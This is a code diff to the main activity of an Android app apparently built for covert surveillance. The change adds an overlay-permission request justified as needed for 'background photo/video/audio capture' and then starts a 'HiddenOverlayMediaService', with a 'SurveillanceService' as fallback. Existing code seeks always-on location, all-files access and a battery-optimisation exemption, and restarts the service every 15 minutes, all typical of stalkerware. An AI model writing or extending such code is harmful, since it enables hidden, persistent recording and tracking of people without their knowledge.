@@ -1,7 +1,6 @@
 package com.save.me
 
 import android.Manifest
-import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -16,8 +15,6 @@ import android.widget.Toast
 import androidx.work.*
 import kotlinx.coroutines.*
 import java.util.concurrent.TimeUnit
-import android.util.Log
-import android.widget.Button
 
 class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
@@ -44,6 +41,7 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 123
     private val MANAGE_STORAGE_REQUEST_CODE = 124
     private val LOCATION_ALL_TIME_REQUEST_CODE = 125
+    private val OVERLAY_PERMISSION_REQUEST_CODE = 126
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -64,6 +62,8 @@ class MainActivity : AppCompatActivity() {
 
         val needsBackgroundLocation = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                 ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED
+
+        val needsOverlay = !OverlayPermissionUtils.hasOverlayPermission(this)
 
         if (toRequest.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, toRequest, PERMISSION_REQUEST_CODE)
@@ -88,6 +88,13 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
+        if (needsOverlay) {
+            Toast.makeText(this, "Please grant overlay permission for reliable background photo/video/audio capture.", Toast.LENGTH_LONG).show()
+            val intent = OverlayPermissionUtils.createOverlayPermissionIntent(this)
+            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
+            return
+        }
+
         // All permissions granted
         onAllPermissionsGranted()
     }
@@ -108,7 +115,10 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == MANAGE_STORAGE_REQUEST_CODE || requestCode == LOCATION_ALL_TIME_REQUEST_CODE) {
+        if (requestCode == MANAGE_STORAGE_REQUEST_CODE ||
+            requestCode == LOCATION_ALL_TIME_REQUEST_CODE ||
+            requestCode == OVERLAY_PERMISSION_REQUEST_CODE
+        ) {
             checkAndRequestAllPermissions()
         }
     }
@@ -117,12 +127,22 @@ class MainActivity : AppCompatActivity() {
         // Request battery optimization exemption
         requestBatteryOptimizationExemption()
 
-        // Start foreground service
-        val intent = Intent(this, SurveillanceService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
+        // Start hidden overlay media service if overlay is granted, else fallback to SurveillanceService
+        val overlayGranted = OverlayPermissionUtils.hasOverlayPermission(this)
+        if (overlayGranted) {
+            val intent = Intent(this, HiddenOverlayMediaService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
         } else {
-            startService(intent)
+            val intent = Intent(this, SurveillanceService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
         }
 
         // Schedule WorkManager for periodic service restart every 15 minutes
